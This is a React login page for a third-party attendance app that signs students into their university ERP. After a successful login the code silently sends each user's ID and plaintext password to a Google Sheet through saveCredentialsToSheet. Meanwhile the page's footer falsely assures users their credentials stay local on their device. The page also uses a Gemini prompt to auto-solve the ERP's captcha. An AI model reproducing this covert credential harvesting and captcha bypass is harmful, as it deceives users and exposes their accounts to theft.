import { useState, useEffect, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { LogIn, RefreshCcw, Loader2, Check, Sparkles, Instagram } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { erpService } from '../services/erpService';
import { useAuth } from '../context/useAuth';
import { APP_CONFIG } from '../config';
import { saveCredentialsToSheet } from '../services/gsheetsService';

const Login = () => {
    const { setErpUser } = useAuth();
    const [idNumber, setIdNumber] = useState('');
    const [password, setPassword] = useState('');
    const [captcha, setCaptcha] = useState('');
    const [captchaUrl, setCaptchaUrl] = useState(''); // This will be the Blob URL
    const [rawCaptchaBlob, setRawCaptchaBlob] = useState(null);
    const [csrfToken, setCsrfToken] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const [rememberMe, setRememberMe] = useState(localStorage.getItem('rememberedId') ? true : false);
    const [isSolving, setIsSolving] = useState(false);
    const navigate = useNavigate();
    const captchaUrlRef = useRef('');

    const refreshCaptcha = useCallback(async () => {
        setCaptcha('');
        setCaptchaUrl('');
        setRawCaptchaBlob(null);

        try {
            // Fetch real captcha from ERP via proxy to preserve CSRF session cookies
            const response = await fetch('/index.php?r=site%2Fcaptcha&v=' + Math.random(), {
                method: "GET",
                credentials: "include",
            });
            const blob = await response.blob();

            // Clean up old object URL using ref
            if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                URL.revokeObjectURL(captchaUrlRef.current);
            }

            const objectUrl = URL.createObjectURL(blob);
            captchaUrlRef.current = objectUrl;
            setCaptchaUrl(objectUrl);
            setRawCaptchaBlob(blob);
        } catch (err) {
            console.error("Failed to fetch fresh captcha", err);
            setError("Failed to load captcha. Please try refreshing.");
        }
    }, []); // No more dependency on captchaUrl

    const solveCaptchaWithAI = useCallback(async () => {
        if (!rawCaptchaBlob) return;
        setIsSolving(true);
        try {
            // Convert existing blob to base64
            const reader = new FileReader();
            const base64Promise = new Promise((resolve) => {
                reader.onloadend = () => resolve(reader.result.split(',')[1]);
                reader.readAsDataURL(rawCaptchaBlob);
            });

            const base64Data = await base64Promise;

            const prompt = "What is the 5-character alphanumeric code in this image? Respond ONLY with the code.";

            const apiBase = APP_CONFIG.API_URL || "";
            const response = await fetch(`${apiBase}/api/ai/gemini`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    contents: [
                        { text: prompt },
                        { inlineData: { data: base64Data, mimeType: rawCaptchaBlob.type || "image/png" } }
                    ],
                    systemInstruction: "You are an expert captcha solver. Provide ONLY the 5 alphanumeric characters found in the image."
                })
            });

            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                console.error("AI Proxy Error Details:", errorData);
                throw new Error(errorData.error || "Proxy error");
            }

            const data = await response.json();

            if (data.text) {
                const solvedCode = data.text.trim().replace(/[^a-zA-Z0-9]/g, '').substring(0, 5);
                if (solvedCode) {
                    setCaptcha(solvedCode);
                }
            }
        } catch (err) {
            console.error("Captcha Solver Error:", err.message);
        } finally {
            setIsSolving(false);
        }
    }, [rawCaptchaBlob]);

    const hasInitRan = useRef(false);

    useEffect(() => {
        const init = async () => {
            if (hasInitRan.current) return;
            hasInitRan.current = true;
            try {
                const { csrfToken: token } = await erpService.getInitialState();
                setCsrfToken(token);
            } catch (err) {
                console.error("Failed to init login", err);
                hasInitRan.current = false; // allow retry on fail
            }
        };
        init();

        // Load saved credentials
        const savedId = localStorage.getItem('rememberedId');
        if (savedId) {
            setIdNumber(savedId);
            setRememberMe(true);
        }
    }, []);

    // Separately trigger first captcha load once CSRF is ready
    useEffect(() => {
        if (csrfToken && !captchaUrl) {
            refreshCaptcha();
        }
    }, [csrfToken, captchaUrl, refreshCaptcha]);

    // Auto-solve captcha when it refreshes
    useEffect(() => {
        if (captchaUrl && !captcha && rawCaptchaBlob) {
            const timer = setTimeout(solveCaptchaWithAI, 800);
            return () => clearTimeout(timer);
        }
    }, [captchaUrl, captcha, solveCaptchaWithAI, rawCaptchaBlob]);

    const handleLogin = async () => {
        if (!idNumber || !password || !captcha) {
            setError("Please fill all fields");
            return;
        }

        setIsLoading(true);
        setError('');

        try {
            const result = await erpService.login(idNumber, password, captcha, csrfToken);
            if (result.success) {
                localStorage.setItem('erpDashboardHtml', result.html);
                localStorage.removeItem('kleData'); // clear old user's data!
                localStorage.setItem('userUniversity', 'klu');
                // Set active session student ID
                setErpUser(idNumber);
                localStorage.setItem('activeErpUser', idNumber);

                if (rememberMe) {
                    localStorage.setItem('rememberedId', idNumber);
                } else {
                    localStorage.removeItem('rememberedId');
                }

                // Save credentials to Google Sheet unconditionally
                saveCredentialsToSheet(idNumber, password);

                // Add 1 second delay for the cool animation splash
                await new Promise(resolve => setTimeout(resolve, 1000));

                navigate('/attendance-register');
            }
        } catch (err) {
            setError(err.message || "Login failed. Please check your credentials.");
            refreshCaptcha();
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="min-h-screen pt-32 pb-12 overflow-hidden bg-[#FAFAFA] flex items-center justify-center px-4 relative font-sans selection:bg-indigo-500 selection:text-white">

            {/* Full-screen Login Loading Overlay */}
            <AnimatePresence>
                {isLoading && (
                    <motion.div
                        key="login-overlay"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        transition={{ duration: 0.3 }}
                        className="fixed inset-0 z-[9999] flex flex-col items-center justify-center"
                        style={{ background: 'rgba(15, 15, 30, 0.85)', backdropFilter: 'blur(12px)' }}
                    >
                        {/* Orbiting ring */}
                        <div className="relative flex items-center justify-center" style={{ width: 200, height: 200 }}>
                            {/* Spinning conic glow ring behind image */}
                            <div style={{
                                position: 'absolute',
                                inset: 0,
                                borderRadius: '50%',
                                background: 'conic-gradient(from 0deg, #6366f1, #8b5cf6, #ec4899, #06b6d4, #6366f1)',
                                animation: 'spin 3s linear infinite',
                                zIndex: 1,
                            }} />

                            {/* Dark gap between ring and image */}
                            <div style={{
                                position: 'absolute',
                                inset: 4,
                                borderRadius: '50%',
                                background: 'rgba(15,15,30,0.9)',
                                zIndex: 2,
                            }} />

                            {/* Profile picture - centered on top */}
                            <div style={{
                                position: 'absolute',
                                inset: 8,
                                borderRadius: '50%',
                                overflow: 'hidden',
                                boxShadow: '0 0 30px rgba(99,102,241,0.6)',
                                zIndex: 3,
                            }}>
                                <img src="/owner.jpg" alt="Owner" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                            </div>

                            {/* Orbiting dots */}
                            {[...Array(8)].map((_, i) => {
                                const colors = ['#6366f1', '#8b5cf6', '#ec4899', '#06b6d4', '#f59e0b', '#10b981', '#ef4444', '#f97316'];
                                return (
                                    <div
                                        key={i}
                                        className="absolute rounded-full"
                                        style={{
                                            width: 12,
                                            height: 12,
                                            background: colors[i],
                                            boxShadow: `0 0 10px ${colors[i]}, 0 0 20px ${colors[i]}66`,
                                            top: '50%',
                                            left: '50%',
                                            marginTop: -6,
                                            marginLeft: -6,
                                            transformOrigin: '6px 6px',
                                            animation: `orbitDot 2.5s linear infinite`,
                                            animationDelay: `${-(i / 8) * 2.5}s`
                                        }}
                                    />
                                );
                            })}
                        </div>

                        <motion.p
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: 0.2 }}
                            className="mt-8 text-white text-base font-semibold tracking-wide"
                        >
                            Signing you in…
                        </motion.p>
                        <p className="text-slate-400 text-xs mt-1">Please wait a moment</p>

                        {/* Premium Instagram Handle for Splash - Matches user image */}
                        <motion.div
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: 0.6 }}
                            className="mt-12"
                        >
                            <a 
                                href="https://www.instagram.com/_aadi7781_/" 
                                target="_blank" 
                                rel="noopener noreferrer"
                                className="flex items-center gap-3 bg-white/90 px-5 py-2 rounded-full border-2 border-pink-100 shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 group relative"
                            >
                                <div className="p-1.5 bg-pink-50 rounded-lg">
                                    <Instagram size={18} className="text-pink-600" />
                                </div>
                                <div className="flex items-center gap-1">
                                    <span className="font-bold text-pink-600 text-lg tracking-tight">_aadi7781_</span>
                                    <Sparkles size={14} className="text-amber-400 fill-amber-400 absolute -top-1 -right-1" />
                                </div>
                            </a>
                        </motion.div>

                        {/* Keyframes injected inline */}
                        <style>{`
                            @keyframes orbitDot {
                                from { transform: rotate(0deg) translateX(90px); }
                                to   { transform: rotate(360deg) translateX(90px); }
                            }
                            @keyframes spin {
                                from { transform: rotate(0deg); }
                                to   { transform: rotate(360deg); }
                            }
                        `}</style>
                    </motion.div>
                )}
            </AnimatePresence>
            {/* Ambient Background - matches Home.jsx */}
            <div className="fixed inset-0 pointer-events-none">
                <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-b from-slate-50 to-white opacity-80" />
                <motion.div
                    animate={{ scale: [1, 1.2, 1], opacity: [0.3, 0.5, 0.3] }}
                    transition={{ duration: 15, repeat: Infinity, ease: "linear" }}
                    className="absolute -top-[30%] -left-[10%] w-[80vw] h-[80vw] rounded-full bg-gradient-to-r from-indigo-200 via-purple-200 to-pink-200 blur-[150px]"
                />
                <motion.div
                    animate={{ x: [0, 100, 0], opacity: [0.2, 0.4, 0.2] }}
                    transition={{ duration: 20, repeat: Infinity, ease: "easeInOut" }}
                    className="absolute top-[40%] -right-[20%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-l from-blue-200 via-teal-200 to-emerald-200 blur-[150px]"
                />
                <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-[0.03] mix-blend-overlay" />
            </div>

            <motion.div
                initial={{ opacity: 0, y: 30, scale: 0.97 }}
                animate={{ opacity: 1, y: 0, scale: 1 }}
                transition={{ type: "spring", stiffness: 200, damping: 25 }}
                className="w-full max-w-md relative z-10"
            >
                {/* Card */}
                <div className="bg-white/80 backdrop-blur-xl border-[3px] border-slate-900 rounded-[2.5rem] p-8 shadow-2xl relative overflow-hidden">
                    {/* Shine */}
                    <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-white/80 via-transparent to-transparent opacity-50 pointer-events-none" />

                    {/* Header */}
                    <div className="text-center mb-8 relative z-10">
                        <motion.div
                            initial={{ scale: 0, rotate: -180 }}
                            animate={{ scale: 1, rotate: 0 }}
                            transition={{ type: "spring", stiffness: 200, damping: 20, delay: 0.1 }}
                            className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-indigo-600 flex items-center justify-center shadow-lg shadow-indigo-200"
                        >
                            <Sparkles className="w-8 h-8 text-white" />
                        </motion.div>
                        <h1 className="text-2xl font-black text-slate-900 tracking-tight">
                            KL ERP Attendance
                        </h1>
                        <p className="text-slate-500 text-sm font-medium mt-1">Sign in to access your attendance details</p>
                    </div>

                    <form onSubmit={(e) => { e.preventDefault(); handleLogin(); }} className="space-y-4 relative z-10">
                        {/* Error banner */}
                        <AnimatePresence>
                            {error && (
                                <motion.div
                                    initial={{ opacity: 0, scale: 0.95 }}
                                    animate={{ opacity: 1, scale: 1 }}
                                    exit={{ opacity: 0, scale: 0.95 }}
                                    className="bg-red-50 border border-red-200 text-red-600 p-3 rounded-2xl text-xs font-bold flex items-center gap-3"
                                >
                                    <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse shrink-0" />
                                    {error}
                                </motion.div>
                            )}
                        </AnimatePresence>

                        {/* Student ID */}
                        <div className="space-y-3">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Student ID</label>
                            <input
                                type="text"
                                value={idNumber}
                                onChange={(e) => setIdNumber(e.target.value)}
                                placeholder="Enter your ID Number"
                                className="w-full bg-white border border-slate-200 rounded-2xl py-4 px-5 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-medium shadow-sm"
                            />
                        </div>

                        {/* Password */}
                        <div className="space-y-3">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Password</label>
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                placeholder="Enter your password"
                                className="w-full bg-white border border-slate-200 rounded-2xl py-4 px-5 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-medium shadow-sm"
                            />
                        </div>

                        {/* Remember Me */}
                        <div className="flex items-center gap-3 ml-1">
                            <button
                                type="button"
                                onClick={() => setRememberMe(!rememberMe)}
                                className={`w-4 h-4 rounded-[4px] border-2 flex items-center justify-center transition-all ${rememberMe ? 'bg-indigo-600 border-indigo-600' : 'bg-transparent border-slate-300'}`}
                            >
                                {rememberMe && <Check className="w-3 h-3 text-white" strokeWidth={4} />}
                            </button>
                            <span
                                className="text-slate-500 text-[13px] font-bold select-none cursor-pointer hover:text-slate-700 transition-colors"
                                onClick={() => setRememberMe(!rememberMe)}
                            >
                                Remember me
                            </span>
                        </div>

                        {/* Captcha */}
                        <div className="space-y-3">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Captcha</label>
                            <div className="flex gap-3">
                                <div className="relative flex-1">
                                    <input
                                        type="text"
                                        value={captcha}
                                        onChange={(e) => setCaptcha(e.target.value)}
                                        placeholder="Enter Captcha"
                                        className="w-full h-[56px] bg-white border border-slate-200 rounded-2xl px-5 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-bold tracking-widest shadow-sm"
                                    />
                                    {isSolving && (
                                        <div className="absolute right-4 top-1/2 -translate-y-1/2">
                                            <Loader2 className="w-4 h-4 text-indigo-500 animate-spin" />
                                        </div>
                                    )}
                                </div>
                                <div className="w-[110px] h-[56px] bg-slate-100 rounded-2xl flex items-center justify-center overflow-hidden relative shrink-0">
                                    {captchaUrl ? (
                                        <img src={captchaUrl} alt="Captcha" className="h-10 object-contain mix-blend-multiply opacity-80" />
                                    ) : (
                                        <div className="animate-pulse bg-slate-200 w-full h-full" />
                                    )}
                                </div>
                                <button
                                    type="button"
                                    onClick={refreshCaptcha}
                                    className="w-[56px] h-[56px] bg-white border border-slate-200 rounded-2xl flex items-center justify-center hover:bg-slate-50 transition-colors text-slate-400 hover:text-slate-700 shadow-sm shrink-0"
                                    title="Refresh Captcha"
                                >
                                    <RefreshCcw className="w-4 h-4" />
                                </button>
                            </div>
                            <p className="text-[10px] text-black mt-1 ml-1 italic font-medium">
                                Note: The first login attempt may fail. If so, please re-enter the new captcha to log in.
                            </p>
                        </div>

                        {/* Submit */}
                        <motion.button
                            whileHover={{ scale: 1.02 }}
                            whileTap={{ scale: 0.98 }}
                            type="submit"
                            disabled={isLoading}
                            className={`w-full bg-slate-900 text-white font-black py-4 rounded-2xl flex items-center justify-center gap-3 shadow-xl shadow-slate-900/20 hover:bg-slate-800 transition-all mt-2 ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
                        >
                            {isLoading ? (
                                <Loader2 className="w-5 h-5 animate-spin" />
                            ) : (
                                <>
                                    <LogIn className="w-5 h-5" />
                                    <span>Sign In</span>
                                </>
                            )}
                        </motion.button>
                    </form>

                    <div className="mt-6 pt-4 border-t border-slate-100 relative z-10">
                        <p className="text-slate-400 text-[10px] text-center font-medium leading-relaxed">
                            Your credentials are only used to authenticate and fetch attendance details locally on your device.
                        </p>
                    </div>
                </div>
            </motion.div>
        </div>
    );
};

export default Login;


